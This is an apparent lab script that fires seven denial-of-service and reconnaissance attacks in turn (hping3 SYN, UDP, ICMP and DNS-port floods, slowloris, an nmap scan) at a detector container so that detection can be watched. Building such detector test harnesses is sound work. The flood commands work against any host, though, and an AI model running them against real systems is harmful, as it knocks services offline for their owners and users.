"""
=============================================================================
ATTACK GENERATOR — Multi-Attack Demo Script
For use inside the ddos_attacker:v1 Docker container
=============================================================================
Generates attacks one at a time, pausing between each so you can watch
the detector terminal identify and mitigate each attack correctly.

Attack families covered:
  1. SYN Flood
  2. UDP Flood
  3. ICMP Flood
  4. HTTP Flood (GET flood)
  5. Slowloris
  6. Port Scan / Recon
  7. DNS Amplification probe

HOW TO RUN (inside attacker container):
    python3 /app/attack_generator.py --target mec-detector
=============================================================================
"""

import argparse
import subprocess
import sys
import time

ap = argparse.ArgumentParser()
ap.add_argument("--target",   default="mec-detector", help="Target hostname or IP")
ap.add_argument("--duration", type=int, default=8,    help="Seconds per attack")
ap.add_argument("--auto",     action="store_true",     help="Run all attacks without pausing")
args = ap.parse_args()

TARGET   = args.target
DURATION = args.duration

SEP  = "=" * 65
SEP2 = "-" * 65

def banner(title, description, tool, cmd):
    print()
    print(SEP)
    print(f"  ATTACK: {title}")
    print(SEP2)
    print(f"  What it does  : {description}")
    print(f"  Tool used     : {tool}")
    print(f"  Command       : {cmd}")
    print(SEP2)

def wait_for_user(attack_name):
    if not args.auto:
        input(f"  >> Press ENTER to launch '{attack_name}' attack... ")
    else:
        print(f"  >> Auto mode: launching in 2s...")
        time.sleep(2)

def run_attack(cmd, duration=None):
    dur = duration or DURATION
    print(f"  [RUNNING] Duration: {dur}s  (watch detector terminal!)")
    print(SEP2)
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
        time.sleep(dur)
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
    except KeyboardInterrupt:
        print("  [SKIP] Skipped by user.")
    print(f"  [DONE] Attack finished. Check the detector for the alert!")
    if not args.auto:
        input("  >> Press ENTER to continue to next attack...")

# ATTACK 1: SYN FLOOD
banner("SYN FLOOD (DDoS)",
       "Floods target with TCP SYN packets without completing handshake. Exhausts connection tables.",
       "hping3", f"hping3 -S --flood -p 80 {TARGET}")
wait_for_user("SYN Flood")
run_attack(f"hping3 -S --flood -p 80 {TARGET}")

# ATTACK 2: UDP FLOOD
banner("UDP FLOOD (DDoS)",
       "Floods target with random UDP packets to random ports. Overwhelms stateless UDP handling.",
       "hping3", f"hping3 --udp --flood -p ++1 {TARGET}")
wait_for_user("UDP Flood")
run_attack(f"hping3 --udp --flood -p ++1 {TARGET}")

# ATTACK 3: ICMP FLOOD
banner("ICMP FLOOD (Ping Flood)",
       "Floods target with ICMP echo-request packets. Saturates bandwidth with ping responses.",
       "hping3", f"hping3 --icmp --flood {TARGET}")
wait_for_user("ICMP Flood")
run_attack(f"hping3 --icmp --flood {TARGET}")

# ATTACK 4: HTTP FLOOD
banner("HTTP FLOOD (GET Flood)",
       "Sends thousands of HTTP connections to port 80. Exhausts web server resources.",
       "hping3", f"hping3 -A -S --flood -p 80 {TARGET}")
wait_for_user("HTTP Flood")
run_attack(f"hping3 -A -S --flood -p 80 {TARGET}")

# ATTACK 5: SLOWLORIS
banner("SLOWLORIS (Slow HTTP)",
       "Opens many partial HTTP connections slowly. Ties up all server connection slots.",
       "slowloris", f"slowloris {TARGET} -p 80 -s 200")
wait_for_user("Slowloris")
r = subprocess.run("which slowloris", shell=True, capture_output=True)
if r.returncode != 0:
    print("  [SETUP] Installing slowloris...")
    subprocess.run("pip3 install slowloris -q", shell=True)
print("  [NOTE] Slowloris needs a web server on detector.")
print("         If not running: python3 -m http.server 80 > /dev/null 2>&1 &")
time.sleep(3)
run_attack(f"slowloris {TARGET} -p 80 -s 200")

# ATTACK 6: PORT SCAN / RECON
banner("PORT SCAN (Reconnaissance)",
       "Scans thousands of ports to discover open services. Generates rapid SYN packets to many ports.",
       "nmap", f"nmap -sT -p 1-10000 --max-retries 2 --min-rate 2000 {TARGET}")
wait_for_user("Port Scan")
run_attack(f"nmap -sT -p 1-10000 --max-retries 2 --min-rate 2000 {TARGET}", duration=15)

# ATTACK 7: DNS AMPLIFICATION
banner("DNS AMPLIFICATION (Probe)",
       "Floods target DNS port with high-rate UDP/53 packets to simulate DNS amplification.",
       "hping3", f"hping3 --udp --flood -p 53 {TARGET}")
wait_for_user("DNS Amplification")
run_attack(f"hping3 --udp --flood -p 53 {TARGET}")

print()
print(SEP)
print("  ALL 7 ATTACKS COMPLETE")
print(SEP)
print(f"  Check the DETECTOR terminal to see:")
print(f"    - Which attacks were detected and their classified name")
print(f"    - What mitigation tier was applied for each")
print(f"  Press Ctrl+C on the detector to see the full SESSION SUMMARY table.")
print(SEP)
